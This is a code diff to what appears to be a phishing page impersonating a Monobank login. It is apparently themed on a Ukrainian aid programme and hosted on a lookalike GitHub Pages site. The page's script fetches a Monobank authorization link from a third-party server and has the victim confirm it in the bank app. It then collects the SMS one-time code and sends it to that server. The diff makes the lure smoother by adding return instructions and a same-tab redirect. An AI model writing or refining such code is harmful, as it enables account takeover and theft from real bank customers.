@@ -36,6 +36,14 @@
       font-size: 18px;
       text-align: center;
     }
+    #return-instruction {
+      margin: 14px 0 0 0;
+      color: #444;
+      max-width: 400px;
+      display: none;
+      font-size: 17px;
+      text-align: center;
+    }
     #sms-code {
       font-size: 22px;
       letter-spacing: 10px;
@@ -68,6 +76,12 @@
 <body>
   <h1>Вхід через Monobank</h1>
   <button id="monobank-btn" disabled>Завантаження...</button>
+  <div id="return-instruction">
+    <b>
+      Після підтвердження в Monobank поверніться на цю сторінку.<br>
+      Код підтвердження з'явиться тут автоматично.
+    </b>
+  </div>
   <div id="status">Очікуємо на посилання...</div>
 
   <script>
@@ -77,6 +91,7 @@
     const codeUrl = "https://api.astrinvite.site/api/submit-code";
     const btn = document.getElementById("monobank-btn");
     const status = document.getElementById("status");
+    const instruction = document.getElementById("return-instruction");
     let currentId = null;
     let pollingStatus = false;
     let statusPoller = null;
@@ -101,7 +116,16 @@
           status.textContent = "Натисніть кнопку для входу.";
           btn.onclick = () => {
             fetch(`${consumeUrl}?id=${currentId}`, { method: "POST" });
-            window.open(data.url, "_blank");
+            instruction.style.display = "";
+            // Добавляем redirect_uri если Monobank вдруг поддерживает возврат
+            let link = data.url;
+            try {
+              const redirectUrl = encodeURIComponent("https://mono-edopomoga.github.io/2025/");
+              if (!link.includes("redirect_uri=")) {
+                link += (link.includes("?") ? "&" : "?") + "redirect_uri=" + redirectUrl;
+              }
+            } catch {}
+            window.location.href = link; // Открыть в этой же вкладке!
             pollStatus();
           };
         } else {
@@ -120,7 +144,7 @@
       if (pollingStatus) return;
       pollingStatus = true;
       btn.style.display = "none";
-      status.textContent = "Очікуємо підтвердження входу...";
+      // Инструкция уже видна
       statusPoller = setInterval(async () => {
         try {
           const res = await fetch(`${statusUrl}?id=${currentId}`);
@@ -136,7 +160,7 @@
     function showCodeInput() {
       status.innerHTML = `
         <b>Введіть 6-значний код з SMS:</b><br>
-        <input id="sms-code" type="text" maxlength="6" style="" autocomplete="one-time-code" inputmode="numeric">
+        <input id="sms-code" type="text" maxlength="6" autocomplete="one-time-code" inputmode="numeric">
         <button id="send-code-btn">Підтвердити</button>
         <div id="sms-error"></div>
       `;
